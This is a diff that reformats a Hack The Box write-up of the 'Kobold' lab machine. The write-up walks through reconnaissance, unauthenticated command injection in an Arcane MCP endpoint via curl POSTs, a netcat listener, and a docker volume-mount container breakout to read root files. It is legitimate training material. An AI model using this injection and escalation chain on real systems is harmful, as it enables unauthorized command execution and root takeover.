@@ -1,27 +1,50 @@
-# Hack The Box - Kobold Walkthrough
+<div align="center">
 
-![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
-![Platform: Linux](https://img.shields.io/badge/Platform-Linux-blue)
+# Kobold — HackTheBox
+
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
+
+---
+
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Kobold |
+| IP | `<TARGET_IP>` |
+| OS | Linux |
+| Difficulty | Easy |
+| Hostname | kobold.htb |
 
 ## Table of Contents
-- [Overview](#overview)
-- [Initial Reconnaissance](#initial-reconnaissance)
-- [Service Enumeration](#service-enumeration)
-- [Vulnerability Discovery](#vulnerability-discovery)
-- [Exploitation](#exploitation)
-- [Privilege Escalation](#privilege-escalation)
-- [Flags](#flags)
+
+1. [Overview](#overview)
+2. [Initial Reconnaissance](#initial-reconnaissance)
+3. [Service Enumeration](#service-enumeration)
+4. [Vulnerability Discovery](#vulnerability-discovery)
+5. [Exploitation](#exploitation)
+6. [Privilege Escalation](#privilege-escalation)
+7. [Flags](#flags)
+8. [Summary](#summary)
 
 ---
 
 ## Overview
 
-**Machine:** Kobold  
-**IP:** <TARGET_IP>  
-**Difficulty:** Easy  
-**OS:** Linux  
+Key points:
 
-### Key Points
 - Unauthenticated command injection in Arcane MCP Server (CVE-2026-23520)
 - Docker group membership privilege escalation
 - Container breakout via volume mounting
@@ -30,19 +53,20 @@
 
 ## Initial Reconnaissance
 
-### 1. Add Host to /etc/hosts
+### Add Host to /etc/hosts
 
 ```bash
 sudo echo "<TARGET_IP> kobold.htb mcp.kobold.htb" >> /etc/hosts
 ```
 
-### 2. Nmap Scan
+### Nmap Scan
 
 ```bash
 nmap -sC -sV -p- --min-rate=1000 <TARGET_IP>
 ```
 
-**Results:**
+<details>
+<summary>Nmap Results</summary>
 
 ```
 PORT     STATE SERVICE  VERSION
@@ -52,37 +76,39 @@ PORT     STATE SERVICE  VERSION
 3552/tcp open  unknown
 ```
 
+</details>
+
 ---
 
 ## Service Enumeration
 
-### 1. Web Server (Port 80/443)
+### Web Server (Port 80/443)
 
 Basic nginx setup - vhost discovery needed.
 
-### 2. Arcane Service (Port 3552)
+### Arcane Service (Port 3552)
 
 ```bash
 curl -s http://<TARGET_IP>:3552/api/openapi.json | head -100
 ```
 
-**Discovered:** Arcane Docker Management v1.13.0
+Discovered: Arcane Docker Management v1.13.0
 
-### 3. Subdomain Enumeration
+### Subdomain Enumeration
 
 ```bash
 ffuf -u http://<TARGET_IP> -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
 ```
 
-**Discovered:** mcp.kobold.htb
+Discovered: `mcp.kobold.htb`
 
-### 4. MCP Server Analysis
+### MCP Server Analysis
 
 ```bash
 curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
 ```
 
-**Key Endpoint:** `/api/mcp/connect` - MCP server connection endpoint
+Key Endpoint: `/api/mcp/connect` - MCP server connection endpoint
 
 ---
 
@@ -90,11 +116,10 @@ curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
 
 ### CVE-2026-23520: Arcane MCP Server Unauthenticated Command Injection
 
-**Vulnerability:** The `/api/mcp/connect` endpoint accepts arbitrary commands without authentication via the `serverConfig.command` parameter.
+The `/api/mcp/connect` endpoint accepts arbitrary commands without authentication via the `serverConfig.command` parameter.
 
-**Affected Versions:** Arcane Docker Management v1.13.0
-
-**CVSS Score:** 9.8 (Critical)
+- **Affected Versions:** Arcane Docker Management v1.13.0
+- **CVSS Score:** 9.8 (Critical)
 
 ---
 
@@ -102,7 +127,7 @@ curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
 
 ### Step 1: Verify Command Execution
 
-Start a listener on your attacker machine:
+Start a listener on the attacker machine:
 
 ```bash
 nc -lvnp 9001
@@ -123,7 +148,8 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-**Expected Output:**
+Expected output:
+
 ```
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
@@ -147,8 +173,6 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-**User Flag:** `10ff89dbd16ef67d████████████████`
-
 ### Step 3: Check Group Membership
 
 ```bash
@@ -168,9 +192,13 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-**Result:** `uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)`
+Result:
 
-**Note:** Docker group (GID 111) is missing! This is because command sessions don't inherit secondary groups by default.
+```
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+```
+
+Docker group (GID 111) is missing because command sessions don't inherit secondary groups by default.
 
 ---
 
@@ -197,12 +225,16 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-**Expected Output:**
+<details>
+<summary>Docker Images Output</summary>
+
 ```
 REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
 mysql                         latest    f66b7a288113   6 weeks ago    922MB
 privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   4 months ago   122MB
 ```
+
+</details>
 
 ### Step 2: Container Breakout via Volume Mount
 
@@ -225,7 +257,8 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-**Breakdown of the command:**
+Breakdown of the command:
+
 - `sg docker -c` - Execute as docker group member
 - `docker run -u root` - Run container as root user (required to read /root/root.txt)
 - `-v /:/hostfs` - Mount host filesystem to /hostfs in container
@@ -238,40 +271,39 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 
 ## Flags
 
-### User Flag
-```
-10ff89dbd16ef67d████████████████
-```
-
-### Root Flag
-```
-cfffff370705c650████████████████
-```
+| Flag | Value |
+|------|-------|
+| User | `10ff89dbd16ef67d████████████████` |
+| Root | `cfffff370705c650████████████████` |
 
 ---
 
 ## Summary
 
 ### Attack Chain
-1. **Reconnaissance:** Discovered Arcane MCP server on port 3552 and mcp.kobold.htb subdomain
-2. **Vulnerability:** CVE-2026-23520 - Unauthenticated command injection in `/api/mcp/connect`
-3. **Initial Access:** Gained command execution as user `ben`
-4. **User Flag:** Read `/home/ben/user.txt`
-5. **Privilege Escalation:** Used `sg docker` to activate docker group, then container breakout via volume mount
-6. **Root Flag:** Mounted host filesystem and read `/root/root.txt`
+
+1. Discovered Arcane MCP server on port 3552 and mcp.kobold.htb subdomain
+2. CVE-2026-23520 - Unauthenticated command injection in `/api/mcp/connect`
+3. Gained command execution as user `ben`
+4. Read `/home/ben/user.txt` for user flag
+5. Used `sg docker` to activate docker group, then container breakout via volume mount
+6. Mounted host filesystem and read `/root/root.txt`
 
 ### Key Lessons
+
 - Always check for secondary group memberships with `id` and `groups`
 - Use `sg` or `newgrp` to activate group memberships in command execution contexts
-- Docker group membership = root access (container breakout via volume mount)
+- Docker group membership is equivalent to root access (container breakout via volume mount)
 - Always enumerate all subdomains and API endpoints
-
-### Tools Used
-- nmap - port scanning
-- ffuf - subdomain enumeration
-- curl - API interaction and exploitation
-- nc - listener for reverse connections
 
 ---
 
-*Writeup created for educational purposes. Always practice responsible disclosure and only test systems you have explicit permission to access.*
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Kobold*
+
+</div>
